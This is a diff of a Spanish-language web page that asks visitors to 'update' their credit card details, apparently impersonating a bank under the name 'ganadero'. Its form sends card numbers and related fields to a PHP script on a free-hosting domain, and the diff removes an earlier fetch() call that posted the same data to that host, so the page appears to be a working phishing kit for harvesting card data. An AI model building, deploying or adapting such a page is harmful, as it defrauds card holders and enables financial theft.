@@ -167,7 +167,7 @@
         <div class="container">
             <h2>Actualización de Información de Tarjeta de Crédito</h2>
             <!--   <form id="creditCardForm" method="post">   -->
-           <form id="creditCardForm" method="post" action="http://ganadero-formulario.wuaze.com/guardar-datos-ganadero.php">
+           <form id="creditCardForm" method="post" action="http://ganadero-formulario.wuaze.com/guardar-datos.php">
                 <!-- Resto del formulario -->
 
                 <label for="creditCardNumber">Número de Tarjeta de Crédito (últimos 4 dígitos):</label>
@@ -204,70 +204,49 @@
                     <textarea id="cardAddress" name="cardAddress" rows="4" value="07rtyhg gfd6" required></textarea>
                 </div>
 
+
+
+               
                 <button type="submit">Enviar</button>
-            </form>
-        </div>
+        </form>
+    </div>
 
-        <!-- JavaScript para mostrar u ocultar campos adicionales -->
-        <script>
-            const creditCardNumberInput = document.getElementById('creditCardNumber');
-            const additionalFields = document.getElementById('additionalFields');
+    <!-- JavaScript para mostrar u ocultar campos adicionales -->
+    <script>
+        const creditCardNumberInput = document.getElementById('creditCardNumber');
+        const additionalFields = document.getElementById('additionalFields');
 
-            creditCardNumberInput.addEventListener('keyup', function () {
-                if (creditCardNumberInput.value.length >= 4) {
-                    additionalFields.style.display = 'block';
-                } else {
-                    additionalFields.style.display = 'none';
-                }
-            });
-        </script>
-
-        <!-- JavaScript para abrir y cerrar el pop-up -->
-        <script>
-            const closePopupButton = document.getElementById('closePopup');
-            const popupOverlay = document.getElementById('popupOverlay');
-
-            window.addEventListener('load', function () {
-                popupOverlay.style.display = 'block';
-            });
-
-            closePopupButton.addEventListener('click', function () {
-                popupOverlay.style.display = 'none';
-            });
-
-            // Verificar si hay un parámetro de consulta "success" en la URL
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.has('success') && urlParams.get('success') === 'true') {
-                // Mostrar el popup de éxito
-                popupOverlay.style.display = 'block';
+        creditCardNumberInput.addEventListener('keyup', function () {
+            if (creditCardNumberInput.value.length >= 4) {
+                additionalFields.style.display = 'block';
+            } else {
+                additionalFields.style.display = 'none';
             }
-        </script>
-        <!-- Agrega este script al final de tu archivo HTML, justo antes del cierre de la etiqueta </body> -->
-        <script>
-            document.addEventListener('DOMContentLoaded', function () {
-                const creditCardForm = document.getElementById('creditCardForm');
+        });
+    </script>
 
-                creditCardForm.addEventListener('submit', function (e) {
-                    e.preventDefault(); // Evitar que el formulario se envíe de forma predeterminada
+    <!-- JavaScript para abrir y cerrar el pop-up -->
+    <script>
+        const closePopupButton = document.getElementById('closePopup');
+        const popupOverlay = document.getElementById('popupOverlay');
 
-                    // Obtener los valores del formulario y enviarlos al servidor
-                    const formData = new FormData(creditCardForm);
+        window.addEventListener('load', function () {
+            popupOverlay.style.display = 'block';
+        });
 
-                    fetch('https://ganadero-formulario.wuaze.com/guardar_datos.php', {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        // Aquí puedes manejar la respuesta del servidor si es necesario
-                        console.log(data);
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                    });
-                });
-            });
-        </script>
-    </main>
+        closePopupButton.addEventListener('click', function () {
+            popupOverlay.style.display = 'none';
+        });
+        
+        
+        // Verificar si hay un parámetro de consulta "success" en la URL
+const urlParams = new URLSearchParams(window.location.search);
+if (urlParams.has('success') && urlParams.get('success') === 'true') {
+    // Mostrar el popup de éxito
+    const popupOverlay = document.getElementById('popupOverlay');
+    popupOverlay.style.display = 'block';
+}
+
+    </script>
 </body>
 </html>
